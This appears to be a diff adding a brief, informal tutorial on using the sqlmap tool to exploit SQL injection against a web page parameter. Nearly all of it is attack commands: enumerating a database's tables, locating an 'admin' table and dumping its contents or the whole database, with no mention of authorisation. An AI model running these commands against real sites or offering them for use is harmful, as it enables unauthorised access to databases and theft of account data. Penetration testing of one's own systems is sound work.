@@ -1,0 +1,13 @@
+sqlmap -u http://localhost/index.php?id=1337 --tables -D database1
+This tells the program to find tables (--tables) in database (-D) names: database1.
+
+Once you execute this you will find (maybe) tons of tables. Locate the one you want...lets call it admin!
+
+sqlmap -u http://localhost/index.php?id=1337 -D database1 -T admin
+
+Now you should see the info of the table admin. But now we should be able to dump it! This can be done by --dump or --dump-all.
+
+Examples:
+python sqlmap.py -u http://localhost/index.php?id=1337 --tables -D database1 --dump-all
+python sqlmap.py -u http://localhost/index.php?id=1337 -D database1 -T admin --dump
+-dump dumps the selected tables content, --dump-all dumps EVERYTHING!
